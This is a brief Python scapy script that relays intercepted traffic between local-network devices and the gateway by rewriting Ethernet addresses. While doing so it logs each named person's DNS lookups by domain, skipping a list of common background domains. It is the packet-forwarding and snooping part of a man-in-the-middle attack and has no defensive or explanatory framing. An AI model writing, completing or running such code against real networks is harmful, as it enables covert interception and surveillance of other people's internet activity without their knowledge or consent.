from scapy.all import *
from scapy.layers.l2 import Ether

NOISE = {
    "wpad.lan", "msftconnecttest.com", "microsoft.com",
    "windowsupdate.com", "steamserver.net", "napps-1.com",
    "datadoghq.com", "onetrust.com", "onetrust.io",
    "gstatic.com", "msftncsi.com", "local.", "icloud.com", "fbcdn.net"
    , "cdninstagram.com "
}

def forward_packet(packet, devices, ip_to_mac, gateway_mac, my_mac):
    if not packet.haslayer(Ether):
        return

    if packet[Ether].src in devices:
        if packet.haslayer(DNS) and packet.haslayer(UDP) and packet[UDP].dport == 53 and packet[DNS].qd:
            domain = packet[DNS].qd.qname.decode()
            root = ".".join(domain.rstrip(".").split(".")[-2:])
            if root not in NOISE:
                info = devices[packet[Ether].src]
                print(f"{info['name']} ({info['device']}) -> {root}")
        packet[Ether].src = my_mac
        packet[Ether].dst = gateway_mac
        sendp(packet, verbose=0)


    elif packet[Ether].src == gateway_mac and packet[Ether].dst == my_mac and packet.haslayer(IP) and packet[IP].dst in ip_to_mac:

        target_mac = ip_to_mac.get(packet[IP].dst)
        if target_mac:
            packet[Ether].src = my_mac
            packet[Ether].dst = target_mac
            sendp(packet, verbose=0)

def start_forwarding(devices, ip_to_mac, gateway_mac, my_mac):
    sniff(
        filter="not arp",
        prn=lambda pkt: forward_packet(pkt, devices, ip_to_mac, gateway_mac, my_mac),
        store=0
    )
